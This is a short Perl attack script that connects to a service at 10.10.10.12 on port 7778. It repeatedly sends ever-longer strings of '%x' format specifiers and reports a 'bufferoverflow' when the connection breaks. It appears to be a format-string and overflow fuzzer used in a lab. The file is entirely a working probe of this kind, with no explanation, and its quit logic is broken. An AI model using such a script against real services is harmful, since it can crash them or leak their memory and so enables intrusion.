#!/usr/bin/perl
#tcpclient.pl

use IO::Socket;

$SIG{'PIPE'} = sub {
    print "\nProgram bufferoverflows \n";
    exit;
};

$socket = new IO::Socket::INET (
                                  PeerAddr  => '10.10.10.12',
                                  PeerPort  =>  7778,
                                  Proto => 'tcp',
                               )                
or die "Couldn't connect to Server\n";
$send_data = '%x' x 100;                                                    
while (1) {
        
        $socket->recv($recv_data,1024);
        print "RECIEVED: $recv_data";     
        print "\nSEND(TYPE quit to Quit):";
        
        $tmp=$send_data;
        chop($tmp); # get rid of new line
        chop($send_data);
        if ($tmp ne 'quit') {
                $socket->send($send_data . "\n")
        }    else {
                $socket->send($send_data);
                close $socket;
                last;
        }

        $send_data = $send_data . '%x' x 100;
}    
    
